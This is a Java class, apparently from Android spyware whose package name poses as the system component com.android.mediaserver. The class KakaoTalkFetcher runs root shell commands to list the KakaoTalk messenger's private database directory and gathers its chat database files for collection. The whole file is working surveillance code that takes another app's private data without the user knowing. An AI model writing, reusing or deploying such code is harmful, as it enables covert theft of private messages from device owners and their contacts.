package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import com.android.mediaserver.shell.Shell.SU;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class KakaoTalkFetcher extends FileFetcher {
  public KakaoTalkFetcher() {
    mFetchedFiles = new ArrayList();
    List<String> res = SU.run("ls /data/data/com.kakao.talk/databases/");
    if (res != null) {
      for (String db : res) {
        if (true == db.contains("KakaoTalk") && !db.contains("journal")) {
          mFetchedFiles.add(
              new FetchedFile(new File("/data/data/com.kakao.talk/databases/" + db), "APP",
                  "kakaotalk"));
        }
      }
    }
  }
}
